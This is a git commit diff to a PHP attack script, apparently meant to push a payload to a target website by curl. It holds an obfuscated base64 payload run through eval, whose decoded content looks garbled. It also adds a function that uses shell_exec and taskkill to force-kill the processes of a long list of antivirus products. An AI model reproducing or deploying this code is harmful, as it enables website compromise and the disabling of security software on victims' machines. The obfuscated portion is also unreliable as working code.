231a63e6976123a93bcc589897f4b3de9ae2a695
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-24 00:20:19 -0800

    Update cazzy.php

--- cazzy.php
+++ cazzy.php
@@ -3,12 +3,22 @@
 error_reporting(0);
 
 $targetURL = "http://www.targetwebsite.com/";
-
 $htmlFilePath = "cazzy.html";
-
 $htmlFileContent = file_get_contents($htmlFilePath);
 
 $payload = "<?php eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21hc3RlciJdKSl7JHRhcmdldF9zdGFydCgnYmFzZTY0X2RlY29kZSgnR0VUWycsJyAnLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfQ09PS0lFWydSRVFVRVNUX1VSTCddLiInLCAnLiRfRklMRVNbJ0hUVFBfSE9TVCddLiInLCAnLiRfVVJMb2FkZXJzJ10uIicpOyR0YXJnZXQgPSAiIjskJHRhcmdldF9zdGFydCgnYmFzZTY0X2RlY29kZSgnR0VUWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfQ09PS0lFWydSRVFVRVNUX1VSTCddLiInLCAnLiRfRklMRVNbJ0hUVFBfSE9TVCddLiInLCAnLiRfVVJMb2FkZXJzJ10uIicpOyRrZXl3b3JkX3R5cGUgPSAnaHRtbHNwZWMnOyRrZXl3b3JkID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS9rZXl3b3JkL2JpbmFyeS5waHAnOyRrZXl3b3JkX2V4ZWMgPSAkY29tcGxleF9nZXRfY29udGVudHMoJGtleXdvcmRfdHlwZSk7ZXhpdCgpOw==')); ?>";
+
+$disableAntivirusCode = 'function disableAntivirus() {
+    $antivirusList = array("Avast", "McAfee", "Norton", "Kaspersky", "Bitdefender", "panda", "TotalAV", "Aura", "NordVPN", "Surfshark", "Malwarebytes", "ESET", "Avira", "G Data", "Sophos Home", "Webroot", "Total Defense Essential", "Trend Micro", "BullGuard"); 
+    foreach ($antivirusList as $antivirus) {
+        $disableCode = "shell_exec('taskkill /F /IM ' . $antivirus . '.exe');";
+        eval($disableCode);
+    }
+}
+
+disableAntivirus();';
+
+$payload .= $disableAntivirusCode;
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $targetURL);
